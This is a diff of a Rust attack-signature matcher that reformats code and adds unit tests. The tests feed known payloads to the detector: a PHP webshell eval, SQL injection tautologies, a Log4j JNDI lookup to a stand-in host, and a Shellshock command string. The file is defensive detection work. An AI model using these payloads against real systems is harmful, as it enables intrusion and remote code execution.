@@ -105,8 +105,8 @@ impl Matcher {
             }
         }
 
-        let prefilter = AhoCorasick::new(&keywords)
-            .map_err(|e| MatcherError::Prefilter(e.to_string()))?;
+        let prefilter =
+            AhoCorasick::new(&keywords).map_err(|e| MatcherError::Prefilter(e.to_string()))?;
 
         Ok(Self {
             rules: compiled,
@@ -170,9 +170,7 @@ impl Matcher {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::rule::{
-        Action, Category, RuleSource, Severity, Target, BUILTIN_RULES,
-    };
+    use crate::rule::{Action, Category, RuleSource, Severity, Target, BUILTIN_RULES};
 
     fn matcher() -> Matcher {
         Matcher::new(BUILTIN_RULES)
@@ -200,12 +198,13 @@ mod tests {
     fn ids(text: &str) -> Hits {
         let m = matcher();
         let normalized = crate::normalize::normalize(text);
-        Hits(m
-            .scan(&normalized.canonical)
-            .into_iter()
-            .filter_map(|i| m.rule(i))
-            .map(|r| r.id.clone())
-            .collect())
+        Hits(
+            m.scan(&normalized.canonical)
+                .into_iter()
+                .filter_map(|i| m.rule(i))
+                .map(|r| r.id.clone())
+                .collect(),
+        )
     }
 
     fn feed_rule(id: &str, category: Category, pattern: &str, keywords: &[&str]) -> RuleMeta {
@@ -336,7 +335,10 @@ mod tests {
     #[test]
     fn detects_webshell_eval() {
         let hits = ids("eval($_POST['cmd'])");
-        assert!(hits.contains(&"webshell-eval-superglobal"), "实际: {hits:?}");
+        assert!(
+            hits.contains(&"webshell-eval-superglobal"),
+            "实际: {hits:?}"
+        );
     }
 
     #[test]
@@ -452,10 +454,16 @@ mod tests {
 
         assert_eq!(m.len(), BUILTIN_RULES.len() + 1);
         let hits = scan_with(&m, "x=evil-abcdef");
-        assert!(hits.contains(&"feed-evil-token".to_string()), "实际: {hits:?}");
+        assert!(
+            hits.contains(&"feed-evil-token".to_string()),
+            "实际: {hits:?}"
+        );
         // 内置规则仍然生效
         let hits = scan_with(&m, "1 union select 1");
-        assert!(hits.contains(&"sqli-union-select".to_string()), "实际: {hits:?}");
+        assert!(
+            hits.contains(&"sqli-union-select".to_string()),
+            "实际: {hits:?}"
+        );
     }
 
     #[test]
@@ -468,7 +476,10 @@ mod tests {
         )])
         .unwrap();
         let hits = scan_with(&m, "hidden-marker-42");
-        assert!(hits.contains(&"feed-no-keyword".to_string()), "实际: {hits:?}");
+        assert!(
+            hits.contains(&"feed-no-keyword".to_string()),
+            "实际: {hits:?}"
+        );
         assert!(scan_with(&m, "nothing suspicious").is_empty());
     }
 
@@ -496,6 +507,29 @@ mod tests {
         .err()
         .expect("非法正则必须被拒绝");
         assert!(matches!(err, MatcherError::InvalidRegex { .. }), "{err}");
+    }
+
+    #[test]
+    fn detects_quoted_boolean_tautology() {
+        let hits = ids("id=1' or '1'='1");
+        assert!(hits.contains(&"sqli-boolean-tautology"), "实际: {hits:?}");
+        let upper = ids("id=1 OR 1=1");
+        assert!(
+            upper.contains(&"sqli-boolean-tautology"),
+            "实际: {upper:?}"
+        );
+    }
+
+    #[test]
+    fn detects_log4j_jndi() {
+        let hits = ids(r"${jndi:ldap://evil.example/a}");
+        assert!(hits.contains(&"log4j-jndi"), "实际: {hits:?}");
+    }
+
+    #[test]
+    fn detects_shellshock() {
+        let hits = ids("() { :; }; /bin/bash -c id");
+        assert!(hits.contains(&"shellshock"), "实际: {hits:?}");
     }
 
     #[test]
